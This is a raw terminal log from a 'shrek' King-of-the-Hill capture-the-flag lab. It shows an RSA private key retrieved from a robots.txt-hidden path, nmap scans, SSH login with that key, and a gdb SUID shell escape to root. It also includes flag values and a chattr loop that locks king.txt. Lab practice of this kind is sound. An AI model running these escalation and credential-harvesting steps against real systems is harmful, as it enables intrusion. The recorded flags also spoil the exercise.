shrek KOTH


```ssh
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAsKHyvIOqmETYwUvLDAWg4ZXHb/oTgk7A4vkUY1AZC0S6fzNE
JmewL2ZJ6ioyCXhFmvlA7GC9iMJp13L5a6qeRiQEVwp6M5AYYsm/fTWXZuA2Qf4z
8o+cnnD+nswE9iLe5xPl9NvvyLANWNkn6cHkEOfQ1HYFMFP+85rmJ2o1upHkgcUI
ONDAnRigLz2IwJHeZAvllB5cszvmrLmgJWQg2DIvL/2s+J//rSEKyISmGVBxDdRm
T5ogSbSeJ9e+CfHtfOnUShWVaa2xIO49sKtu+s5LAgURtyX0MiB88NfXcUWC7uO0
Z1hd/W/rzlzKhvYlKPZON+J9ViJLNg36HqoLcwIDAQABAoIBABaM5n+Y07vS9lVf
RtIHGe4TAD5UkA8P3OJdaHPxcvEUWjcJJYc9r6mthnxF3NOGrmRFtDs5cpk2MOsX
u646PzC3QnKWXNmeaO6b0T28DNNOhr7QJHOwUA+OX4OIio2eEBUyXiZvueJGT73r
I4Rdg6+A2RF269yqrJ8PRJj9n1RtO4FPLsQ/5d6qxaHp543BMVFqYEWvrsdNU2Jl
VUAB652BcXpBuJALUV0iBsDxbqIKFl5wIsrTNWh+hkUTwo9HroQEVd4svCN+Jr5B
Npr81WG2jbKqOx2kJVFW/yCivmr/f/XokyOLBi4N/5Wqq+JuHD0zSPTtY5K04SUd
63TWQ5kCgYEA32IwfmDwGZBhqs3+QAH7y46ByIOa632DnZnFu2IqKySpTDk6chmh
ONSfc4coKwRq5T0zofHIKLYwO8vVpJq4iQ31r+oe7fAHh08w/mBC3ciCSi6EQdm5
RMxW0i4usAuneJ04rVmWWHepADB0BqYiByWtWFYAY9Kpks/ks9yWHn8CgYEAymxD
q3xvaWFycawJ+I/P5gW8+Wr1L3VrGbBRj1uPhNF0yQcA03ZjyyViDKeT/uBfCCxX
LPoLmoLYGmisl/MGq3T0g0TtrgvkFU6qZ3sjYJ+O/yrT06HYapJLv6Ns/+98uNvi
3VEQodZNII8P6WLk3RPp1NzDVcFDLmD9C40UAQ0CgYBokPgOUKZT8Sgm4mJ/5+3M
LZtHF4PvdEOmBJNw0dTXeUPesHNRcfnsNmulksEU0e6P/IQs7Jc7p30QoKwTb3Gu
hmBZxohP7So5BrLygHEMjI2g2AGFKbv2HokNvhyQwAPXDBG549Pi+bCcrBHEAwSu
v85TKX7pO3WxiauPHlUPVQKBgFmIF0ozKKgIpPDoMiTRnxfTc+kxyK6sFanwFbL9
wXXymuALi+78D1mb+Ek2mbwDC6V2zzwigJ1fwCu2Hpi6sjmF6lxhUWtI8SIHgFFy
4ovrJvlvvO9/R1SjzoM9yolNKPIut6JCJ8QdIFIFVPlad3XdR/CRkIhOieNqnKHO
TYnFAoGAbRrJYVZaJhVzgg7H22UM+sAuL6TR6hDLqD2wA1vnQvGk8qh95Mg9+M/X
6Zmia1R6Wfm2gIGirxK6s+XOpfqKncFmdjEqO+PHr4vaKSONKB0GzLI7ZlOPPU5V
Q2FZnCyRqaHlYUKWwZBt2UYbC46sfCWapormgwo3xA8Ix/jrBBI=
-----END RSA PRIVATE KEY-----
```
root@ip-10-10-13-24:~# nmap 10.10.29.94

Starting Nmap 7.60 ( https://nmap.org ) at 2024-09-27 10:47 BST
Nmap scan report for ip-10-10-29-94.eu-west-1.compute.internal (10.10.29.94)
Host is up (0.00050s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
8009/tcp open  ajp13
8080/tcp open  http-proxy
9999/tcp open  abyss
MAC Address: 02:D3:72:51:BC:A3 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 1.87 seconds

root@ip-10-10-13-24:~# ssh -i key.pem shrek@10.10.29.94
The authenticity of host '10.10.29.94 (10.10.29.94)' can't be established.
ECDSA key fingerprint is SHA256:q9K14ILwuQ6aUiuLgCn+Vp4k/3sU97bMD+j/DxqjxLk.
Are you sure you want to continue connecting (yes/no)? ^C
root@ip-10-10-13-24:~# chmod 400 key.pem 
root@ip-10-10-13-24:~# ssh -i key.pem shrek@10.10.29.94
The authenticity of host '10.10.29.94 (10.10.29.94)' can't be established.
ECDSA key fingerprint is SHA256:q9K14ILwuQ6aUiuLgCn+Vp4k/3sU97bMD+j/DxqjxLk.
Are you sure you want to continue connecting (yes/no)? ^C
root@ip-10-10-13-24:~# ftp 10.10.29.94
Connected to 10.10.29.94.
220 (vsFTPd 3.0.2)
Name (10.10.29.94:root): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp> ^C
ftp> exit
221 Goodbye.
root@ip-10-10-13-24:~# ssh -i key.pem shrek@10.10.29.94
The authenticity of host '10.10.29.94 (10.10.29.94)' can't be established.
ECDSA key fingerprint is SHA256:q9K14ILwuQ6aUiuLgCn+Vp4k/3sU97bMD+j/DxqjxLk.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.29.94' (ECDSA) to the list of known hosts.
[shrek@shrek ~]$ ls
check.sh  flag.txt
[shrek@shrek ~]$ cat flag.txt
0069ba233da89efe6f48e7d214034130
[shrek@shrek ~]$ gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit

GNU gdb (GDB) Red Hat Enterprise Linux 7.6.1-115.el7
Copyright (C) 2013 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-redhat-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
sh-4.2# ls
check.sh  flag.txt
sh-4.2# cd ..
sh-4.2# ls
donkey	puss  shrek
sh-4.2# cd puss
sh-4.2# ls
flag.txt  telnetd
sh-4.2# cat flag.txt 
6f960e8f2ea8e3de92f192fae492ec59
sh-4.2# cd ..
sh-4.2# ls
donkey	puss  shrek
sh-4.2# cd donkey
sh-4.2# ls
flag.txt  ftp
sh-4.2# cat flag.txt
974acecd51cc45c843062fdac6235e97
sh-4.2# ls
flag.txt  ftp
sh-4.2# ls ftp
file
sh-4.2# ls ftp/file
ftp/file
sh-4.2# cd ~
sh-4.2# ls
check.sh  flag.txt
sh-4.2# cat flag.txt
0069ba233da89efe6f48e7d214034130
sh-4.2# cd ..
sh-4.2# cd ..
sh-4.2# ls
bin   dev  home  lib64	mnt  proc  run	 srv  tmp  var
boot  etc  lib	 media	opt  root  sbin  sys  usr
sh-4.2# cd root
sh-4.2# ls
anaconda-ks.cfg  king.txt  root  root.txt
sh-4.2# cat root.txt
8cc6ece048e



chattr +i /root/king.txt

chattr -i /root/king.txt && (while true; do echo cyber30 >> /root/king.txt; sleep 0.1; done) & chattr +i /root/king.txt

find / -name flag.txt 2>/dev/null






root@ip-10-10-98-96:~# nmap 10.10.55.203

Starting Nmap 7.60 ( https://nmap.org ) at 2024-09-29 14:09 BST
Nmap scan report for ip-10-10-55-203.eu-west-1.compute.internal (10.10.55.203)
Host is up (0.00025s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
MAC Address: 02:05:A4:AF:EF:A9 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 1.74 seconds
root@ip-10-10-98-96:~# ftp 10.10.33.127
Connected to 10.10.33.127.
220 (vsFTPd 3.0.2)
Name (10.10.33.127:root): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp> exit
221 Goodbye.
root@ip-10-10-98-96:~# curl http://10.10.33.127/https-robot.txt
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /https-robot.txt was not found on this server.</p>
</body></html>
root@ip-10-10-98-96:~# curl http://10.10.33.127/http-robots.txt
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /http-robots.txt was not found on this server.</p>
</body></html>
root@ip-10-10-98-96:~# curl http://10.10.33.127/robots.txt
User-agent: *
Disallow: /Cpxtpt2hWCee9VFa.txt
root@ip-10-10-98-96:~# curl http://10.10.33.127//Cpxtpt2hWCee9VFa.txt
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAsKHyvIOqmETYwUvLDAWg4ZXHb/oTgk7A4vkUY1AZC0S6fzNE
JmewL2ZJ6ioyCXhFmvlA7GC9iMJp13L5a6qeRiQEVwp6M5AYYsm/fTWXZuA2Qf4z
8o+cnnD+nswE9iLe5xPl9NvvyLANWNkn6cHkEOfQ1HYFMFP+85rmJ2o1upHkgcUI
ONDAnRigLz2IwJHeZAvllB5cszvmrLmgJWQg2DIvL/2s+J//rSEKyISmGVBxDdRm
T5ogSbSeJ9e+CfHtfOnUShWVaa2xIO49sKtu+s5LAgURtyX0MiB88NfXcUWC7uO0
Z1hd/W/rzlzKhvYlKPZON+J9ViJLNg36HqoLcwIDAQABAoIBABaM5n+Y07vS9lVf
RtIHGe4TAD5UkA8P3OJdaHPxcvEUWjcJJYc9r6mthnxF3NOGrmRFtDs5cpk2MOsX
u646PzC3QnKWXNmeaO6b0T28DNNOhr7QJHOwUA+OX4OIio2eEBUyXiZvueJGT73r
I4Rdg6+A2RF269yqrJ8PRJj9n1RtO4FPLsQ/5d6qxaHp543BMVFqYEWvrsdNU2Jl
VUAB652BcXpBuJALUV0iBsDxbqIKFl5wIsrTNWh+hkUTwo9HroQEVd4svCN+Jr5B
Npr81WG2jbKqOx2kJVFW/yCivmr/f/XokyOLBi4N/5Wqq+JuHD0zSPTtY5K04SUd
63TWQ5kCgYEA32IwfmDwGZBhqs3+QAH7y46ByIOa632DnZnFu2IqKySpTDk6chmh
ONSfc4coKwRq5T0zofHIKLYwO8vVpJq4iQ31r+oe7fAHh08w/mBC3ciCSi6EQdm5
RMxW0i4usAuneJ04rVmWWHepADB0BqYiByWtWFYAY9Kpks/ks9yWHn8CgYEAymxD
q3xvaWFycawJ+I/P5gW8+Wr1L3VrGbBRj1uPhNF0yQcA03ZjyyViDKeT/uBfCCxX
LPoLmoLYGmisl/MGq3T0g0TtrgvkFU6qZ3sjYJ+O/yrT06HYapJLv6Ns/+98uNvi
3VEQodZNII8P6WLk3RPp1NzDVcFDLmD9C40UAQ0CgYBokPgOUKZT8Sgm4mJ/5+3M
LZtHF4PvdEOmBJNw0dTXeUPesHNRcfnsNmulksEU0e6P/IQs7Jc7p30QoKwTb3Gu
hmBZxohP7So5BrLygHEMjI2g2AGFKbv2HokNvhyQwAPXDBG549Pi+bCcrBHEAwSu
v85TKX7pO3WxiauPHlUPVQKBgFmIF0ozKKgIpPDoMiTRnxfTc+kxyK6sFanwFbL9
wXXymuALi+78D1mb+Ek2mbwDC6V2zzwigJ1fwCu2Hpi6sjmF6lxhUWtI8SIHgFFy
4ovrJvlvvO9/R1SjzoM9yolNKPIut6JCJ8QdIFIFVPlad3XdR/CRkIhOieNqnKHO
TYnFAoGAbRrJYVZaJhVzgg7H22UM+sAuL6TR6hDLqD2wA1vnQvGk8qh95Mg9+M/X
6Zmia1R6Wfm2gIGirxK6s+XOpfqKncFmdjEqO+PHr4vaKSONKB0GzLI7ZlOPPU5V
Q2FZnCyRqaHlYUKWwZBt2UYbC46sfCWapormgwo3xA8Ix/jrBBI=
-----END RSA PRIVATE KEY-----

root@ip-10-10-98-96:~# 
root@ip-10-10-98-96:~# curl http://10.10.33.127//Cpxtpt2hWCee9VFa.txt >id_rsa
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--  100  1676  100  1676    0     0   818k      0 --:--:-- --:--:-- --:--:--  818k
root@ip-10-10-98-96:~# cat id_rsa 
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAsKHyvIOqmETYwUvLDAWg4ZXHb/oTgk7A4vkUY1AZC0S6fzNE
JmewL2ZJ6ioyCXhFmvlA7GC9iMJp13L5a6qeRiQEVwp6M5AYYsm/fTWXZuA2Qf4z
8o+cnnD+nswE9iLe5xPl9NvvyLANWNkn6cHkEOfQ1HYFMFP+85rmJ2o1upHkgcUI
ONDAnRigLz2IwJHeZAvllB5cszvmrLmgJWQg2DIvL/2s+J//rSEKyISmGVBxDdRm
T5ogSbSeJ9e+CfHtfOnUShWVaa2xIO49sKtu+s5LAgURtyX0MiB88NfXcUWC7uO0
Z1hd/W/rzlzKhvYlKPZON+J9ViJLNg36HqoLcwIDAQABAoIBABaM5n+Y07vS9lVf
RtIHGe4TAD5UkA8P3OJdaHPxcvEUWjcJJYc9r6mthnxF3NOGrmRFtDs5cpk2MOsX
u646PzC3QnKWXNmeaO6b0T28DNNOhr7QJHOwUA+OX4OIio2eEBUyXiZvueJGT73r
I4Rdg6+A2RF269yqrJ8PRJj9n1RtO4FPLsQ/5d6qxaHp543BMVFqYEWvrsdNU2Jl
VUAB652BcXpBuJALUV0iBsDxbqIKFl5wIsrTNWh+hkUTwo9HroQEVd4svCN+Jr5B
Npr81WG2jbKqOx2kJVFW/yCivmr/f/XokyOLBi4N/5Wqq+JuHD0zSPTtY5K04SUd
63TWQ5kCgYEA32IwfmDwGZBhqs3+QAH7y46ByIOa632DnZnFu2IqKySpTDk6chmh
ONSfc4coKwRq5T0zofHIKLYwO8vVpJq4iQ31r+oe7fAHh08w/mBC3ciCSi6EQdm5
RMxW0i4usAuneJ04rVmWWHepADB0BqYiByWtWFYAY9Kpks/ks9yWHn8CgYEAymxD
q3xvaWFycawJ+I/P5gW8+Wr1L3VrGbBRj1uPhNF0yQcA03ZjyyViDKeT/uBfCCxX
LPoLmoLYGmisl/MGq3T0g0TtrgvkFU6qZ3sjYJ+O/yrT06HYapJLv6Ns/+98uNvi
3VEQodZNII8P6WLk3RPp1NzDVcFDLmD9C40UAQ0CgYBokPgOUKZT8Sgm4mJ/5+3M
LZtHF4PvdEOmBJNw0dTXeUPesHNRcfnsNmulksEU0e6P/IQs7Jc7p30QoKwTb3Gu
hmBZxohP7So5BrLygHEMjI2g2AGFKbv2HokNvhyQwAPXDBG549Pi+bCcrBHEAwSu
v85TKX7pO3WxiauPHlUPVQKBgFmIF0ozKKgIpPDoMiTRnxfTc+kxyK6sFanwFbL9
wXXymuALi+78D1mb+Ek2mbwDC6V2zzwigJ1fwCu2Hpi6sjmF6lxhUWtI8SIHgFFy
4ovrJvlvvO9/R1SjzoM9yolNKPIut6JCJ8QdIFIFVPlad3XdR/CRkIhOieNqnKHO
TYnFAoGAbRrJYVZaJhVzgg7H22UM+sAuL6TR6hDLqD2wA1vnQvGk8qh95Mg9+M/X
6Zmia1R6Wfm2gIGirxK6s+XOpfqKncFmdjEqO+PHr4vaKSONKB0GzLI7ZlOPPU5V
Q2FZnCyRqaHlYUKWwZBt2UYbC46sfCWapormgwo3xA8Ix/jrBBI=
-----END RSA PRIVATE KEY-----

root@ip-10-10-98-96:~# chmod 600 id_rsa 
root@ip-10-10-98-96:~# ssh - id_rsa shrek@10.10.33.127
ssh: Could not resolve hostname -: Temporary failure in name resolution
root@ip-10-10-98-96:~# 
root@ip-10-10-98-96:~# ssh -i id_rsa shrek@10.10.33.127
The authenticity of host '10.10.33.127 (10.10.33.127)' can't be established.
ECDSA key fingerprint is SHA256:q9K14ILwuQ6aUiuLgCn+Vp4k/3sU97bMD+j/DxqjxLk.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.33.127' (ECDSA) to the list of known hosts.
[shrek@shrek ~]$ ls
check.sh  flag.txt
[shrek@shrek ~]$ cat flag.txt
0069ba233da89efe6f48e7d214034130
[shrek@shrek ~]$ gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
GNU gdb (GDB) Red Hat Enterprise Linux 7.6.1-115.el7
Copyright (C) 2013 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-redhat-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
sh-4.2# ls
check.sh  flag.txt
sh-4.2# cd .. && ls
donkey	puss  shrek
sh-4.2# cat donkey/flag.txt
974acecd51cc45c843062fdac6235e97
sh-4.2# cat puss/flag.txt
6f960e8f2ea8e3de92f192fae492ec59
sh-4.2# cat /root/flag.txt
cat: /root/flag.txt: No such file or directory
sh-4.2# cd /root
sh-4.2# ls
anaconda-ks.cfg  king.txt  root  root.txt
sh-4.2# cat  root.txt
8cc6ece048e6c42251c411814ff5a22d
sh-4.2# ls
anaconda-ks.cfg  king.txt  root  root.txt
sh-4.2# cd ..
sh-4.2# ls
bin   dev  home  lib64	mnt  proc  run	 srv  tmp  var
boot  etc  lib	 media	opt  root  sbin  sys  usr
sh-4.2# wc -l /root/root.txt
1 /root/root.txt
sh-4.2# wc -w /root/root.txt
1 /root/root.txt
sh-4.2# wc /root/root.txt
 1  1 33 /root/root.txt
sh-4.2# wc /home/puss/flag.txt
 1  1 33 /home/puss/flag.txt
sh-4.2# find / -type f -name "*.txt" 2>/dev/null -exec bash -c 'for f; do [ "$(basename "$f" | wc -c)" -eq 33 ] && echo "$f"; done' _ {} + 
/usr/share/doc/kexec-tools-2.0.15/kdump-in-cluster-environment.txt
/usr/share/doc/git-1.8.3.1/git-credential-cache--daemon.txt
/usr/local/go/src/cmd/go/testdata/mod/example.com_downgrade_v2.0.0.txt
/usr/local/go/src/cmd/go/testdata/mod/golang.org_x_internal_v0.1.0.txt
/usr/local/go/src/cmd/go/testdata/script/mod_list_compiled_concurrent.txt
sh-4.2# find / -type f -name "*.txt" 2>/dev/null -exec bash -c 'for f; do [ "$(basename "$f" | wc -c)" -eq 34 ] && echo "$f"; done' _ {} +
/usr/share/doc/git-1.8.3.1/howto/recover-corrupted-blob-object.txt
/usr/local/go/src/cmd/go/testdata/mod/example.com_badchain_a_v1.0.0.txt
/usr/local/go/src/cmd/go/testdata/mod/example.com_badchain_a_v1.1.0.txt
/usr/local/go/src/cmd/go/testdata/mod/example.com_badchain_b_v1.0.0.txt
/usr/local/go/src/cmd/go/testdata/mod/example.com_badchain_b_v1.1.0.txt
/usr/local/go/src/cmd/go/testdata/mod/example.com_badchain_c_v1.0.0.txt
/usr/local/go/src/cmd/go/testdata/mod/example.com_badchain_c_v1.1.0.txt
/usr/local/go/src/cmd/go/testdata/mod/example.com_missingpkg_v1.0.0.txt
/usr/local/go/src/cmd/go/testdata/mod/example.com_newcycle_a_v1.0.0.txt
/usr/local/go/src/cmd/go/testdata/mod/example.com_newcycle_a_v1.0.1.txt
/usr/local/go/src/cmd/go/testdata/mod/example.com_newcycle_b_v1.0.0.txt
/usr/local/go/src/cmd/go/testdata/mod/not-rsc.io_quote_v0.1.0-nomod.txt
sh-4.2# 
sh-4.2# cat /usr/share/doc/git-1.8.3.1/git-credential-cache--daemon.txt 
git-credential-cache--daemon(1)
===============================

NAME
----
git-credential-cache--daemon - Temporarily store user credentials in memory

SYNOPSIS
--------
[verse]
git credential-cache--daemon <socket>

DESCRIPTION
-----------

NOTE: You probably don't want to invoke this command yourself; it is
started automatically when you use linkgit:git-credential-cache[1].

This command listens on the Unix domain socket specified by `<socket>`
for `git-credential-cache` clients. Clients may store and retrieve
credentials. Each credential is held for a timeout specified by the
client; once no credentials are held, the daemon exits.

GIT
---
Part of the linkgit:git[1] suite




